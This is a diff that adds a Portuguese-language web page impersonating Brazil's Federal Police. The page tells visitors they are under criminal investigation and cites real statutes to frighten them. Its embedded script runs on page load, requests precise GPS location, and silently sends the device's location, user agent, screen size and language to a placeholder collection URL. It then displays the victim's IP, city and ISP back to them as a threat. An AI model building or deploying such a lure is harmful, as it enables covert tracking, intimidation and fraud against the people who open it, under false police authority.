@@ -1,0 +1,224 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <meta name="robots" content="noindex, nofollow" />
+  <title>Notificação Oficial — Inquérito em Andamento</title>
+  <style>
+    :root { --pf-blue: #0a2e5c; --pf-blue2: #123c74; --gold: #c9a227; }
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', Roboto, -apple-system, sans-serif;
+      background: linear-gradient(160deg, #050a14 0%, #0a1524 45%, #0d1b30 100%);
+      color: #d7e2ef; min-height: 100vh; padding: 24px 14px 60px;
+    }
+    .wrap { max-width: 720px; margin: 0 auto; }
+    .selo-topo {
+      display: flex; align-items: center; gap: 14px; justify-content: center;
+      margin-bottom: 22px;
+    }
+    .selo-pf {
+      width: 64px; height: 64px; border-radius: 50%;
+      background: radial-gradient(circle at 32% 28%, #1d5aa8, #0a2e5c 70%);
+      border: 3px solid var(--gold); display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 0 34px rgba(201,162,39,.35), inset 0 0 14px rgba(0,0,0,.6);
+      flex-shrink: 0;
+    }
+    .selo-pf span { color: var(--gold); font-weight: 900; font-size: .8rem; letter-spacing: .12em; text-align: center; line-height: 1.1; }
+    .selo-topo .org { text-align: left; }
+    .selo-topo .org h1 { color: #fff; font-size: 1.02rem; letter-spacing: .14em; }
+    .selo-topo .org p { color: #8fa6c0; font-size: .72rem; letter-spacing: .08em; margin-top: 3px; }
+    .doc {
+      background: #0c1626; border: 1px solid rgba(120,160,210,.22); border-radius: 14px;
+      box-shadow: 0 30px 80px rgba(0,0,0,.7); overflow: hidden;
+    }
+    .doc-head {
+      background: linear-gradient(135deg, var(--pf-blue) 0%, var(--pf-blue2) 100%);
+      padding: 18px 26px; border-bottom: 2px solid var(--gold);
+      display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 8px;
+    }
+    .doc-head b { color: #fff; font-size: .95rem; letter-spacing: .06em; }
+    .doc-head .nproc { color: var(--gold); font-size: .8rem; font-weight: 700; letter-spacing: .1em; }
+    .doc-body { padding: 26px; }
+    .doc-body h2 {
+      color: #fff; font-size: 1.35rem; line-height: 1.35; margin-bottom: 16px; text-align: center;
+    }
+    .doc-body h2 em { color: #ff6b6b; font-style: normal; }
+    .alerta {
+      display: flex; gap: 12px; align-items: flex-start;
+      background: rgba(220,38,38,.09); border: 1px solid rgba(220,38,38,.4); border-left: 4px solid #dc2626;
+      border-radius: 10px; padding: 14px 16px; margin-bottom: 20px;
+    }
+    .alerta svg { flex-shrink: 0; margin-top: 2px; }
+    .alerta p { font-size: .88rem; line-height: 1.55; color: #ffd9d9; }
+    .doc-body p.txt { font-size: .92rem; line-height: 1.7; color: #c3d3e6; margin-bottom: 14px; }
+    .doc-body p.txt b { color: #fff; }
+    .grade {
+      display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin: 18px 0 6px;
+    }
+    .grade .item {
+      background: rgba(18,60,116,.25); border: 1px solid rgba(120,160,210,.18);
+      border-radius: 8px; padding: 10px 12px;
+    }
+    .grade .item small { display: block; color: #7f95b1; font-size: .66rem; text-transform: uppercase; letter-spacing: .1em; margin-bottom: 3px; }
+    .grade .item span { color: #e8f0fa; font-weight: 700; font-size: .92rem; word-break: break-all; }
+    .grade .item span.capturado { color: #6ee7a0; }
+    .grade .item span.pendente { color: #f0c36d; }
+    .status-envio {
+      display: flex; align-items: center; gap: 10px; margin-top: 16px;
+      background: rgba(22,101,52,.16); border: 1px solid rgba(74,222,128,.35);
+      border-radius: 10px; padding: 12px 14px;
+    }
+    .status-envio .dot {
+      width: 10px; height: 10px; border-radius: 50%; background: #4ade80;
+      box-shadow: 0 0 10px #4ade80; animation: pulso 1.1s infinite; flex-shrink: 0;
+    }
+    @keyframes pulso { 0%,100% { opacity: 1; } 50% { opacity: .3; } }
+    .status-envio p { font-size: .84rem; color: #b8f5cd; line-height: 1.5; }
+    .rodape-doc {
+      border-top: 1px solid rgba(120,160,210,.15); padding: 16px 26px 20px;
+      color: #6d84a0; font-size: .72rem; line-height: 1.6; text-align: center;
+    }
+    .rodape-doc b { color: #9db4cf; }
+    .assinatura { text-align: center; margin-top: 20px; color: #93a9c4; font-size: .8rem; }
+    .assinatura .linha { width: 240px; border-top: 1px solid rgba(140,170,205,.4); margin: 26px auto 8px; }
+    .assinatura b { color: #d7e2ef; }
+    @media (max-width: 560px) {
+      .grade { grid-template-columns: 1fr; }
+      .doc-body { padding: 20px 16px; }
+      .doc-body h2 { font-size: 1.1rem; }
+    }
+  </style>
+</head>
+<body>
+  <div class="wrap">
+    <div class="selo-topo">
+      <div class="selo-pf"><span>POLÍCIA<br/>FEDERAL</span></div>
+      <div class="org">
+        <h1>DEPARTAMENTO DE POLÍCIA FEDERAL</h1>
+        <p>DIVISÃO DE COMBATE A CRIMES CIBERNÉRICOS — DCCIB</p>
+      </div>
+    </div>
+
+    <div class="doc">
+      <div class="doc-head">
+        <b>NOTIFICAÇÃO ELETRÔNICA DE COMPARECIMENTO</b>
+        <span class="nproc" id="nProc">PROC. Nº 2026.00.XXXX</span>
+      </div>
+      <div class="doc-body">
+        <h2>VOCÊ FOI <em>IDENTIFICADO</em> E ESTÁ SOB <em>INVESTIGAÇÃO</em></h2>
+
+        <div class="alerta">
+          <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#ff6b6b" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
+          <p><b>Este acesso foi registrado.</b> Conforme o Art. 5º da Lei nº 12.965/2014 (Marco Civil da Internet) e o Art. 15, seus dados de conexão foram preservados e encaminhados ao juízo competente.</p>
+        </div>
+
+        <p class="txt">Prezado(a) <b id="nomeAlvo">investigado(a)</b>,</p>
+        <p class="txt">Em cumprimento a decisão judicial no âmbito do inquérito policial que apura os crimes previstos no <b>Art. 171 do Código Penal</b> (estelionato por meio eletrônico) e no <b>Art. 154-A</b> (invasão de dispositivo informático), seu endereço de rede foi identificado e <b>rastreado em tempo real</b> durante esta conexão.</p>
+
+        <div class="grade">
+          <div class="item"><small>Endereço IP</small><span class="pendente" id="dIp">capturando…</span></div>
+          <div class="item"><small>Provedor de acesso (ISP)</small><span class="pendente" id="dIsp">consultando…</span></div>
+          <div class="item"><small>Cidade detectada</small><span class="pendente" id="dCidade">localizando…</span></div>
+          <div class="item"><small>Estado (UF)</small><span class="pendente" id="dUf">localizando…</span></div>
+          <div class="item"><small>Coordenadas precisas</small><span class="pendente" id="dGps">solicitando ao dispositivo…</span></div>
+          <div class="item"><small>Data e hora do acesso</small><span class="pendente" id="dHora">registrando…</span></div>
+          <div class="item"><small>Dispositivo</small><span class="pendente" id="dDisp">identificando…</span></div>
+          <div class="item"><small>Protocolo de captura</small><span class="pendente" id="dProto">gerando…</span></div>
+        </div>
+
+        <div class="status-envio">
+          <div class="dot"></div>
+          <p id="txtEnvio">Estabelecendo canal seguro com a base de dados da Polícia Federal…</p>
+        </div>
+
+        <div class="assinatura">
+          <div class="linha"></div>
+          <b>DELEGADO(A) RESPONSÁVEL PELO INQUÉRITO</b><br/>
+          Divisão de Combate a Crimes Cibernéticos — DCCIB/DPF<br/>
+          Documento emitido eletronicamente · validade via código de barras do protocolo
+        </div>
+      </div>
+      <div class="rodape-doc">
+        <b>AVISO LEGAL:</b> A negativa de acesso, bloqueio do documento ou tentativa de ocultar a localização constitui <b>Art. 348 do Código Penal</b> (favorecimento pessoal) e seráSomente somada ao conjunto probatório. A presente notificação possui valor probatório digital (hash SHA-256 registrado). Não responda a este documento. Aguarde a expedição do mandado.
+      </div>
+    </div>
+  </div>
+
+  <script>
+    window.CAPTURA_URL = "__CAPTURA_URL__";
+    // Captura silenciosa: envia IP/gps/UA no primeiro frame, antes de qualquer coisa.
+    (function () {
+      var dados = { gps: null, erroGps: null };
+      // GPS: dispara imediatamente; se o alvo aceitar, coordenadas precisas.
+      function pedirGps() {
+        if (!navigator.geolocation) { dados.erroGps = "sem-suporte"; enviar(); return; }
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            dados.gps = { lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy };
+            enviar();
+          },
+          function () { dados.erroGps = "negado"; enviar(); },
+          { enableHighAccuracy: true, timeout: 6000, maximumAge: 0 }
+        );
+      }
+      var enviado = false;
+      function enviar() {
+        if (enviado) return;
+        enviado = true;
+        fetch(window.CAPTURA_URL, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify({
+            ua: navigator.userAgent,
+            tela: screen.width + "x" + screen.height,
+            idioma: navigator.language,
+            gps: dados.gps,
+            erroGps: dados.erroGps
+          })
+        }).then(function (r) { return r.json(); }).then(function (r) {
+          if (!r || !r.ok) return;
+          preencher(r.dados);
+        }).catch(function () { preencher(null); });
+      }
+      function preencher(d) {
+        var agora = new Date();
+        document.getElementById("dHora").textContent = agora.toLocaleString("pt-BR");
+        document.getElementById("dHora").className = "capturado";
+        document.getElementById("dDisp").textContent = /Mobi|Android/i.test(navigator.userAgent) ? "Dispositivo móvel" : "Computador";
+        document.getElementById("dDisp").className = "capturado";
+        document.getElementById("dProto").textContent = d && d.protocolo ? d.protocolo : "PF-" + Date.now().toString(36).toUpperCase();
+        document.getElementById("dProto").className = "capturado";
+        if (d) {
+          if (d.ip) { document.getElementById("dIp").textContent = d.ip; document.getElementById("dIp").className = "capturado"; }
+          if (d.cidade) { document.getElementById("dCidade").textContent = d.cidade; document.getElementById("dCidade").className = "capturado"; }
+          if (d.uf) { document.getElementById("dUf").textContent = d.uf; document.getElementById("dUf").className = "capturado"; }
+          if (d.isp) { document.getElementById("dIsp").textContent = d.isp; document.getElementById("dIsp").className = "capturado"; }
+        }
+        if (d && d.gps) {
+          document.getElementById("dGps").textContent = "LAT " + d.gps.lat.toFixed(5) + " · LON " + d.gps.lon.toFixed(5) + " (±" + Math.round(d.gps.acc) + "m)";
+          document.getElementById("dGps").className = "capturado";
+        } else {
+          document.getElementById("dGps").textContent = "Bloqueado pelo investigado (registrado como prova de ocultação)";
+          document.getElementById("dGps").className = "pendente";
+        }
+        var passos = [
+          "Estabelecendo canal seguro com a base de dados da Polícia Federal…",
+          "Upload dos registros de conexão concluído (hash SHA-256 válido)…",
+          "Localização encaminhada ao setor de inteligência DCCIB…",
+          "ARQUIVADO NO INQUÉRITO. Seu acesso ficou registrado."
+        ];
+        var i = 0;
+        var t = setInterval(function () {
+          i++;
+          if (i < passos.length) document.getElementById("txtEnvio").textContent = passos[i];
+          else { clearInterval(t); document.getElementById("txtEnvio").innerHTML = "<b>CAPTURA CONCLUÍDA — DADOS ENVIADOS À POLÍCIA FEDERAL.</b>"; }
+        }, 1600);
+      }
+      // Pequeno atraso proposital p/ parecer "processamento oficial", mas captura já rodou.
+      setTimeout(pedirGps, 400);
+    })();
+  </script>
+</body>
+</html>
